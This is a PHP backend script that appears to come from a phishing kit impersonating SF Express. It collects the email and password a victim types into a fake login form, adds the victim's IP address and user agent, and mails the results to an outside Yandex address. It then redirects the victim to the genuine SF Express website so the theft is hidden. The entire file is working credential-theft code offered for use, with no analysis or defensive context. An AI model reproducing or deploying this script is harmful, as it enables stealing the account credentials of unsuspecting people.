<?php
if($_POST["email"] != "" and $_POST["psw"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------sf-express Info-----------------------\n";
$message .= "Email            : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['psw']."\n";
$message .= "Email Address           : ".$_POST['eml']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "feelhappy5050@yandex.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: http://www.sf-express.com/cn/sc/");
}else{
header ("Location: index.php");
}

?>